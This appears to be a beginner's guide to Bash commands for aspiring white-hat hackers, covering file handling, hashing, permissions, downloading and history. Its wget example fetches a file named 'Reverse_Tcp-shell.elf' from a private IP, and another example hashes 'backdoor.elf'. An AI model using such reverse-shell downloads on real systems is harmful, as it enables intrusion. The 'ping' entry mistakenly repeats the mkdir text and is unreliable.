### Introduction
The acronym **BASH** stands for: *Bourne Again Shell,* which is a *command interpreter* based on its predecessor, the *Bourne* shell.  This environment allows you to interact with your OS via commands, and normally runs inside your terminal, but you can also run a Bash/Shell script as a standalone executable. This guide covers some very useful Bash commands for WhiteHatters.

Many Bash commands are intuitive, for example you could fire up a terminal and ask:
	<pre>$ whatis bash <br>bash (1)    - GNU Bourne-Again SHell</pre>
To locate source files, man pages and executables:

<pre>$ whereis bash
bash: /bin/bash /etc/bash.bashrc /usr/share/man/man1/bash.1.gz</pre>



### Helpful Commands
**1. man** <br>
It is very important to learn how to find help when using terminal commands. Most **.nix**  systems include built-in manual pages to get information about almost any command such as: proper syntax, options, attributes, and even examples of correctly formatted commands.
<pre>$ man commandName</pre>
Man displays the manual page entry for a given command.<br>

**2. info, -h, and --help** <br>
The info command shows helpful information about most Bash commands. For a shorter version of the available help pages, try the command name followed by either *-h or --help.*
<pre>$ info commandName</pre>

<pre>$ bash --help </pre>
Both *info and --help* show useful command options and syntax.

**3. sudo** <br>
Some commands need to be executed with SuperUser or root authority. If you are not logged in as root user on a Unix/Linux/Apple OSX/etc. machine, use *sudo* followed by the command you want to be executed as root user.
<pre>$ sudo ifconfig</pre>

SuperUser do this commandName
<pre>$ sudo su</pre> Sudo, escalate my privledges to SuperUser
### Local Discovery
**A. whoami**<br>
One of the first things to do is to find out who you are, what permissions you have and what is your current working directory.  Am I logged in as root or just another user?</pre>
<pre>$ whoami</pre>

**B. pwd**<br>
Print Working Directory is a simple command that prints your current working directory. This is how you find out where you are in a Linux/Unix file structure.
<pre>$ pwd
$ /home/user/Desktop/Apps</pre>

**C. ls**<br>
The LS command is widely used and lists information about files and directories. Defaults to the current directory.
<pre>$ ls -lia /home/user</pre>
List -a: all, including hidden files/dirs in -l: long list format, -i: include the Inode index

**D. locate**<br>
If you are trying to locate a particular file this command works well. It is sometimes necessary to run the *updatedb* command first before using *locate* because updatedb refreshes your machine's file database index.
<pre>$ updatedb</pre>

<pre>$ locate foo.bar
$ /home/user/Documents/foo.bar</pre>

**E. file**<br>
In **.nix** environments, file extensions don't tell us much about what kind of file we're dealing with. For instance you could name a file: myfile.mine and make it executable by setting the file's executable bit: *Chmod u+x fileName.* However, you can use *file* followed by the file name to discover the file's type.
<pre>$ file foo.bar
$ ASCII text</pre>

### Files and Directories
**1. cd**<br>
Change directories, from the current working directory to a /new/location.
<pre>$ cd ../home/user</pre>
Changes directory to the (..) parent directory of /home/user<br>

**2. mkdir**<br>
Make a new directory.
<pre>$ mkdir /var/www/html/NewWebsite</pre>

**3. rmdir**<br>
Remove a directory. Note: a directory must be empty before deleting it, unless you use additional parameters with *rmdir* to delete a dir and its subdirectories forcefully.
<pre>$ rmdir /var/www/html/OldWebsite</pre>

**4. rm**<br>
Remove or delete files and directories. Options include: -f: force, don't prompt me. -r: recursive, delete directories and their contents recursively.
<pre>$ rm -rf Deleteme/</pre>

**5. shred**<br>
Note that if you use rm to remove a file, it might be possible to recover some of its contents, given sufficient expertise and/or time. For greater assurance that the contents are truly unrecoverable, consider using shred. Options include: -u: truncate and remove file after overwriting. -v: verbose, show progress. -z: add a final overwrite with zeros to hide shredding
<pre>$ shred -vzu /home/myTop/Secret/File.txt</pre>

**6. mv**<br>
Move a file from location A to location B and/or rename it.
<pre>$ mv /home/user/mydoc.php /home/user/Anotherdoc.php</pre>

**7. cp**<br>
Copy a file to a new location, but the old file remains by default.
<pre>$ cp myfile_Name.docx /home/usr/path/NewName.docx</pre>

**8. touch**<br>
Create an empty file, or modify the file's time-stamp, Date accessed, & Date modified.
<pre>$ touch file_1.sh</pre>

**9. nano**<br>
Edit an existing file or create a new one if it doesn’t exist with nano, one of the many command line text editors. Nano also performs syntax highlighting when you name a file with a relevant extension. For example: *nano file.php* will create/edit this file.php, in the local directory and display highlighting for the PHP syntax.
<pre>$ nano /path/to/file/Index.html</pre>
**10. head**<br>
The opposite of tail, use to display the head of a file.
<pre>$ head access.log</pre>
**11. tail**<br>
The opposite of head, displays the tail end of a file.
<pre>$ tail access.log</pre>
### Utilities & Programs
**a. echo**<br>
Used in many programming languages, *echo* displays a line of text to *stndout*. However you can use special parameters like: > to print to a file and overwrite it if it already exists. Also: >> which means append output to a file, or: < which is used for output redirection, some call it input. Other options: -e: enable interpretation of backslash escapes:\f: form feed, \n: new line \r: carriage Return. The following command appends a string to the end of list.txt with a new line in between.
<pre>$ echo -e "this line\n of text" >> list.txt</pre>
**b. md5sum**<br>
The program md5sum is designed to verify data integrity using the MD5 (Message-Digest Algorithm 5) 128-bit cryptographic hash. MD5 hashes used properly can confirm both file integrity and authenticity. When you download any file or application, always run a strong hashing function to be sure the file has not been tampered with.
<pre>$ md5sum ubuntu-16.04.2-server-amd64.iso</pre>
**c. sha1sum**<br>
The sha1sum utility is also used to verify file integrity, using an Algorithm that produces the sha1checksum (hash value: fingerprint) of a file. The Hash is printed to *stdnout*, which in our case is the terminal screen.
<pre>$ sha1sum backdoor.elf</pre>
**d. cat**<br>
CAT is an acronym for concatenate. It combines: concatenates, files or prints text and files to the standard output. The first command concatenates two files and outputs the results to a third file. The second command simply displays the contents of the file to *stndout*.
<pre>$ cat file_1 file_2 > Combined_File_3</pre>
<pre>$ cat nally.txt</pre>
<pre>$ cat ./-weird_Office-file_name(2).docx.docx</pre>
Display a file with a dash in the name with ./
**e. chmod**<br>
Change mode allows you to change file mode bits. In **.nix** environments, file and folder permissions are displayed with the ls command, beginning with: Directory/Link: 1 bit, followed by: user/group/owner with 3 bits each: (-DUUUGGGOOO) The: + operator adds selected file mode bits, and: - removes them. So to give the current user and group execute permissions on a file try this:
<pre>$ chmod ug+x Endless_ping_loop.sh</pre>
Now run the executable file with ./file_name.ext
**f. wget**<br>
This neat tool is known as the non-interactive network downloader. And it does just that, this command downloads a file from a remote server.
<pre>$ wget http://192.168.53.4/files/Reverse_Tcp-shell.elf </pre>
**g. rsync**<br>
Used to backup and copy files based on changes in them. At some point, current technologies like Dropbox and others use utilities similar to rsync in order to keep your data synchronized with what's in the cloud. Rsync can also backup over the network using ssh. Read MAN page! Local backup: -a: archive, -z: compress data during transfer, -v: increase verbosity
<pre>$ rsync -azv /path/folder1/macs.db /path/folder2/macs_copy.db</pre>
**h. xxd**<br>
Make a hexdump or do the reverse. This simple command uses -r: reverse, to convert a hexadecimal file to binary format.
<pre>$ xxd -r  original.hex reverse.bin</pre>
**i. history**<br>
This simple command shows a numbered list of the previous commands you have entered since you last erased your Bash history.
<pre>$ history</pre>
$ 1 ls -al
  2 cd ../our/parents/child/dir
  3 whoami
  4 echo hello > foo.bar</pre>
If you want to run any previous command, just use: !#number
<pre>$ !3
$ root</pre>
### Networking Commands and Special Characters.
**1. ping**<br>
Make a new directory.
<pre>$ mkdir /var/www/html/NewWebsite</pre>
**2. dig**<br>
Dig for DNS records.
<pre>$ dig www.NewWebsite.com</pre>
